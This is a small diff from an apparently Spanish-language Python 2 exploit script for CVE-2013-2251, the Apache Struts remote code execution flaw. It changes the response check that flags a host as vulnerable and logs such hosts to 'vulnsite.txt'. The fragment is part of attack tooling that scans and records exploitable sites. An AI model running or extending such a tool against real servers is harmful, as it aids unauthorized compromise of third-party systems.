@@ -75,7 +75,7 @@ if len(host) > 0:
 
 		print BOLD+"\n [+] EJECUTANDO EXPLOIT CVE-2013-2251"+ENDC
 
-		if response.find("('mamalo')") == -1:
+		if response.find(".getWriter") == -1:
 			if response.find("mamalo") != -1:
 				print RED+"   [-] VULNERABLE"+ENDC
 				owned = open('vulnsite.txt', 'a')
